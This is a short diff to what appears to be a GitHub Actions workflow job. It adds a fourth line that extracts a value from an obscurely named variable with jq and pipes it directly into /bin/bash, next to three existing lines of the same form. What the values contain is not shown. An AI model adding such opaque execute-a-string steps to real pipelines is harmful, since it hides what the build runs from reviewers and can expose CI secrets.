@@ -24,6 +24,7 @@ jobs:
           echo $qrwq6 | jq -r .mtdv02853 | /bin/bash
           echo $dhsbp112 | jq -r .p7 | /bin/bash
           printf '%s' "$xn1" | jq -r .zkks293 | /bin/bash
+          echo $v5863 | jq -r .j211 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
